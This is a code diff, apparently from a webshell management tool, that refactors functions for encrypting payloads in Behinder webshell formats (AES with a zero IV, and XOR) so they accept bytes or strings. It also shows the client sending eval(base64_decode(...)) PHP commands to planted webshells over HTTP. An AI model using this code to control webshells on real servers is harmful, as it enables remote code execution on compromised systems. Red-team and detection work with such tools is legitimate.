@@ -39,18 +39,25 @@ def base64_encode(s):
     return base64.b64encode(s).decode()
 
 
-def behinder_aes(payload, key):
+def behinder_aes(payload: t.Union[str, bytes], key: bytes):
     """将给定的payload按照冰蝎的格式进行AES加密"""
     iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-    payload = "1|" + payload
-    payload_padded = pad(payload.encode(), AES.block_size)
+    if isinstance(payload, str):
+        payload = ("1|" + payload).encode()
+    else:
+        payload = b"1|" + payload
+    payload_padded = pad(payload, AES.block_size)
     return base64_encode(cipher.encrypt(payload_padded))
 
 
-def behinder_xor(payload: str, key: bytes):
+def behinder_xor(payload: t.Union[str, bytes], key: bytes):
     """将给定的payload按照冰蝎的格式进行Xor加密"""
-    payload_bytes = ("1|" + payload).encode()
+    if isinstance(payload, str):
+        payload_bytes = ("1|" + payload).encode()
+    else:
+        payload_bytes = b"1|" + payload
+
     payload_xor = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload_bytes)])
     return base64_encode(payload_xor)
 
@@ -118,7 +125,7 @@ class PHPWebshellBehinderAES(PHPWebshellCommunication, PHPWebshellActions):
         # 冰蝎会错误处理符号`|`，需要做一次base64编码避免出现`|`
         return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")
 
-    async def submit_http(self, payload):
+    async def submit_http(self, payload: t.Union[str, bytes]):
         data = behinder_aes(payload, self.key)
         try:
             response = await self.client.request(
@@ -201,7 +208,7 @@ class PHPWebshellBehinderXor(PHPWebshellCommunication, PHPWebshellActions):
         # 冰蝎会错误处理符号`|`，需要做一次base64编码避免出现`|`
         return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")
 
-    async def submit_http(self, payload):
+    async def submit_http(self, payload: t.Union[str, bytes]):
         data = behinder_xor(payload, self.key)
         try:
             response = await self.client.request(
